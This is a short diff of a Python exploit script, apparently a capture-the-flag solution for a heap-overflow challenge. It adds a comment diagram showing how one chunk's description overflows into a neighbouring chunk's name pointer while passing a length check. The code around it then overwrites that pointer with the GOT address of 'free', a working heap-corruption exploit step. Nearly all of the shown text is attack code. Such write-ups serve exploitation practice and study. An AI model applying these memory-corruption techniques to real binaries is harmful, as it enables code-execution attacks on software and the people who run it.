@@ -106,7 +106,12 @@ if __name__ == "__main__":
     #delete(2)
     raw_input('after deleting the in-between item...')
 
-    # chunk 'G' will be placed between chunk 'C-1' and chunk 'C-2'
+    #
+    # [chunk A-desc] [chunk A-name] [chunk G-desc] [chunk E-desc] [chunk E-name] [chunk G-name]
+    #                                ------------------------------->      
+    #                                            we can overwrite the first 4 bytes of [chunk E-name]
+    #                                            while satisfying (p + len_text >= p2 -4)                   
+    #
     add(128, 'GGGG', 4, 'HHHH')
     raw_input('after adding 1 item...')
     update(3, 168+4, 'X'*168+p32(b.got['free']))
